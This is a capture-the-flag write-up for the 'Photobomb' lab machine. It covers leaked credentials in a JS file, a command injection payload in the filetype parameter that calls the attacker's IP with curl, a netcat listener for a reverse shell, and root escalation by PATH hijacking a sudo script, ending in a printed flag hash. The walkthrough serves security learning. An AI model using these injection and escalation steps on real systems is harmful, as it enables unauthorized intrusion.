### Add Domain to Hosts file.
***

Photobomb uses a domain name of ````photobomb.htb````.
```
sudo vi /etc/hosts 
```
and add
```
10.10.11.182  photobomb.htb
```
After visiting to the site, there is a login page present which is 
```
http://photobomb.htb/printer
```
When reading the source code I found a ```photobomb.js``` file . </br>

![image](https://user-images.githubusercontent.com/68991993/208419660-22f2e72b-e5ef-4c91-a077-01c87fdb3d52.png) </br>

Suprisingly the photobomb.js file have login details of the site. </br>

![image](https://user-images.githubusercontent.com/68991993/208420206-d3ea6f2e-f75d-4236-a303-f8a80d9dd8fb.png) </br>

## Login 
I logged in using the url ```http://pH0t0:b0Mb!@photobomb.htb/printer``` </br>

![image](https://user-images.githubusercontent.com/68991993/208422056-5ab9d7eb-6b4a-4c63-91e6-c9acd70e67c7.png)
</br>

## Capturing request using burpsuite.
These are the parameters sent to server. I checked all of them for command injection and found that filetype is vulnerable. 

![image](https://user-images.githubusercontent.com/68991993/208422257-76721764-f14f-4b66-b9a9-c00beb37dd6a.png) </br>
![image](https://user-images.githubusercontent.com/68991993/208429522-b43908d6-18ec-4416-b3e5-76f4baf982ef.png) </br>

To verify that i used curl to send a request to my linux machine. 
1) First started a python server. </br>
 
![image](https://user-images.githubusercontent.com/68991993/208430441-51549e70-c1d9-47a3-933c-1b17cfc3b77d.png) </br>
2) Sent the request in burp using payload 

``` filetype=jpg;curl -XGET 10.10.14.105:8000``` </br>

![image](https://user-images.githubusercontent.com/68991993/208430723-d31e4425-e63e-4d79-9df3-b8ac1d4f2a60.png) </br>

3) Got request to my machine </br>

![image](https://user-images.githubusercontent.com/68991993/208430822-137fbb25-13ac-418a-b909-f90fb378526f.png) </br>

so the command injection is comfirmed and we need to get a reverse shell now.

## Reverse Shell
1) Start a listener </br>
``` sudo netcat -lvnp 9001 ``` </br>
![image](https://user-images.githubusercontent.com/68991993/208432411-7ad35f1a-9c17-4834-8634-b45ab42f1db3.png) </br>

2) Create a payload and url encode it. I used revshells.com to create a python reverse shell. </br>
 
![image](https://user-images.githubusercontent.com/68991993/208433090-ea7b7fe2-d164-4cf4-b0c5-323ee99e2404.png) </br>
![image](https://user-images.githubusercontent.com/68991993/208433241-ea3a1d4d-8760-4ea4-8e52-a93e973326e2.png) </br>

3) Got reverse shell </br>

![image](https://user-images.githubusercontent.com/68991993/208432854-6a3d99ec-1cd9-4a23-8c52-339a5143bc25.png) </br>


## User Flag

![image](https://user-images.githubusercontent.com/68991993/208433730-09e14f80-8757-4a7b-b8fc-2dee3cb61f38.png)

## Root Flag

For the root flag we need to do privilege escalation.
1) Check the sudo rights of user
``` 
$ sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
```
2) Reading the /opt/cleanup.sh file
```
$ cat /opt/cleanup.sh
cat /opt/cleanup.sh
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```
3) We can take advantage of the fact that we can change variables such as the path to take a custom find command, and under the context of sudo our find will be executed as root For this we will create a find file that is worth bash and we will give it execution permissions

```
$ echo bash > find
$ chmod +x find 
```
4) Now by changing the path variable we execute the script and get root </br>
```
$ sudo PATH=$PWD:$PATH /opt/cleanup.sh
root@photobomb:/home/wizard/photobomb# ls
1  find  log  photobomb.sh  public  resized_images  server.rb  source_images
root@photobomb:/home/wizard/photobomb# cd /
root@photobomb:/# ls
bin   dev  home  lib32  libx32      media  opt   root  sbin  sys  usr
boot  etc  lib   lib64  lost+found  mnt    proc  run   srv   tmp  var
root@photobomb:/# cd root
root@photobomb:~# ls
root.txt
root@photobomb:~# cat root.txt
8380325b1ea2d19343bb97b83ab03359
root@photobomb:~# 
```





